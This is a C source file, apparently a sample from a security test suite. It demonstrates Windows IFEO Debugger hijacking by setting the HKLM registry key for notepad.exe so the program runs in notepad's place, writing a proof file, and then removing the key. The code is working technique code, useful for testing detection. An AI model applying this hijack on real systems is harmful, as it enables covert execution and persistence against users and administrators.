// SAMPLE: g2_18 | Image File Execution Options (IFEO) Debugger Hijacking | Group: Execution Hijacking
//
// g2_18_ifeo_debugger.c — Demonstrates execution hijacking via IFEO Debugger registry value.
//
// Technique:
//   Image File Execution Options (IFEO) is a Windows mechanism designed for developers
//   to attach a debugger automatically when a specific executable is launched.
//   An attacker with administrative privileges sets:
//     HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\<victim.exe>\Debugger = "<attacker_payload.exe>"
//   When any user or service launches <victim.exe>, Windows intercepts the execution
//   and launches <attacker_payload.exe> instead, passing the victim executable command
//   line as arguments.
//
// Dual-Role Design:
//   Role A (Setup — argc == 1):
//     1. Gets full path to self.
//     2. Creates IFEO registry key under HKLM for the target (e.g., notepad.exe).
//        (Note: Writing to HKLM requires administrative privileges).
//     3. Sets the "Debugger" string value to self's path.
//     4. Calls CreateProcessA("notepad.exe") — Windows intercepts this and launches
//        self in Role B instead of notepad.
//     5. Waits for child process to complete and immediately cleans up the IFEO key.
//     6. Verifies proof file was generated.
//
//   Role B (Debugger / Hijacked Handler — argc >= 2):
//     1. Invoked by Windows loader because it was set as the IFEO Debugger.
//     2. Receives victim process path/arguments in argv.
//     3. This IS the hijacked execution path.
//     4. Writes C1 proof file and exits.
//
// C1 RULE: Proof is written by the hijacked debugger executable (Role B).
//
// Compile: x86_64-w64-mingw32-gcc -O2 -o g2_18_ifeo_debugger.exe g2_18_ifeo_debugger.c -ladvapi32

#include "../shared/c1_proof.h"
#include <windows.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

#define TARGET_IMAGE "notepad.exe"
#define IFEO_SUBKEY  "SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\" TARGET_IMAGE

/* Helper: cleanup IFEO registry entry */
static void cleanup_ifeo_key(void) {
    LONG rc = RegDeleteKeyA(HKEY_LOCAL_MACHINE, IFEO_SUBKEY);
    if (rc == ERROR_SUCCESS) {
        printf("[ifeo_debugger:setup] Cleaned up IFEO key for %s\n", TARGET_IMAGE);
    } else {
        /* In case subkeys or permissions differ, try deleting value */
        HKEY hKey = NULL;
        if (RegOpenKeyExA(HKEY_LOCAL_MACHINE, IFEO_SUBKEY, 0, KEY_SET_VALUE, &hKey) == ERROR_SUCCESS) {
            RegDeleteValueA(hKey, "Debugger");
            RegCloseKey(hKey);
            RegDeleteKeyA(HKEY_LOCAL_MACHINE, IFEO_SUBKEY);
        }
    }
}

int main(int argc, char *argv[]) {
    /* -------------------------------------------------------------
     * Role B: Launched by Windows as the IFEO "Debugger"
     * ------------------------------------------------------------- */
    if (argc >= 2) {
        /*
         * HIJACKED EXECUTION PATH:
         * We were launched because Windows intercepted the launch of TARGET_IMAGE
         * and executed our binary instead, passing the original image/args in argv.
         */
        int rc = write_c1_proof("g2_18_ifeo_debugger", "IFEODebuggerHijack");
        if (rc != 0) {
            fprintf(stderr, "[ifeo_debugger:debugger] write_c1_proof failed: %d\n", rc);
            return EXIT_FAILURE;
        }
        return EXIT_SUCCESS;
    }

    /* -------------------------------------------------------------
     * Role A: Setup IFEO Hijacking Key and Trigger Execution
     * ------------------------------------------------------------- */
    char selfPath[MAX_PATH];
    if (!GetModuleFileNameA(NULL, selfPath, MAX_PATH)) {
        fprintf(stderr, "[ifeo_debugger:setup] GetModuleFileNameA failed: %lu\n",
                GetLastError());
        return EXIT_FAILURE;
    }

    /* Ensure sandbox directory exists */
    CreateDirectoryA("C:\\C1_Sandbox", NULL);

    /* Delete old proof file if present */
    DeleteFileA(C1_PROOF_PATH);

    printf("[ifeo_debugger:setup] Self path: %s\n", selfPath);
    printf("[ifeo_debugger:setup] Configuring IFEO for target: %s\n", TARGET_IMAGE);

    /* Open or create the IFEO key in HKLM */
    HKEY hKey = NULL;
    LONG rc = RegCreateKeyExA(
        HKEY_LOCAL_MACHINE,
        IFEO_SUBKEY,
        0, NULL,
        REG_OPTION_NON_VOLATILE,
        KEY_SET_VALUE | KEY_QUERY_VALUE,
        NULL,
        &hKey,
        NULL);

    if (rc == ERROR_ACCESS_DENIED) {
        fprintf(stderr, "[ifeo_debugger:setup] Access Denied: HKLM IFEO modification requires administrative privileges.\n");
        fprintf(stderr, "[ifeo_debugger:setup] Please run from an elevated command prompt on the test environment.\n");
        return EXIT_FAILURE;
    } else if (rc != ERROR_SUCCESS) {
        fprintf(stderr, "[ifeo_debugger:setup] RegCreateKeyExA failed: %ld\n", rc);
        return EXIT_FAILURE;
    }

    /* Set the "Debugger" value to point to our executable */
    rc = RegSetValueExA(
        hKey,
        "Debugger",
        0,
        REG_SZ,
        (const BYTE *)selfPath,
        (DWORD)(strlen(selfPath) + 1));

    RegCloseKey(hKey);

    if (rc != ERROR_SUCCESS) {
        fprintf(stderr, "[ifeo_debugger:setup] RegSetValueExA('Debugger') failed: %ld\n", rc);
        cleanup_ifeo_key();
        return EXIT_FAILURE;
    }

    printf("[ifeo_debugger:setup] IFEO Debugger value set successfully.\n");

    /*
     * Trigger execution: Spawn TARGET_IMAGE.
     * The OS loader intercepts this call and runs selfPath instead.
     */
    printf("[ifeo_debugger:setup] Spawning %s (intercepted by Windows IFEO)...\n", TARGET_IMAGE);

    STARTUPINFOA si;
    PROCESS_INFORMATION pi;
    ZeroMemory(&si, sizeof(si));
    si.cb = sizeof(si);
    ZeroMemory(&pi, sizeof(pi));

    char cmdLine[MAX_PATH];
    snprintf(cmdLine, sizeof(cmdLine), "%s", TARGET_IMAGE);

    BOOL created = CreateProcessA(
        NULL,
        cmdLine,
        NULL,
        NULL,
        FALSE,
        0,
        NULL,
        NULL,
        &si,
        &pi);

    /* Immediately cleanup the IFEO key so system stability is preserved */
    cleanup_ifeo_key();

    if (!created) {
        fprintf(stderr, "[ifeo_debugger:setup] CreateProcessA(%s) failed: %lu\n",
                cmdLine, GetLastError());
        return EXIT_FAILURE;
    }

    /* Wait for intercepted debugger process (Role B) to write proof and exit */
    WaitForSingleObject(pi.hProcess, 5000);
    CloseHandle(pi.hProcess);
    CloseHandle(pi.hThread);

    /* Verify proof file */
    DWORD attr = GetFileAttributesA(C1_PROOF_PATH);
    if (attr == INVALID_FILE_ATTRIBUTES) {
        fprintf(stderr, "[ifeo_debugger:setup] Proof file was not created by hijacked process.\n");
        return EXIT_FAILURE;
    }

    printf("[ifeo_debugger:setup] IFEO Debugger Hijacking verified — proof confirmed at %s\n",
           C1_PROOF_PATH);
    return EXIT_SUCCESS;
}
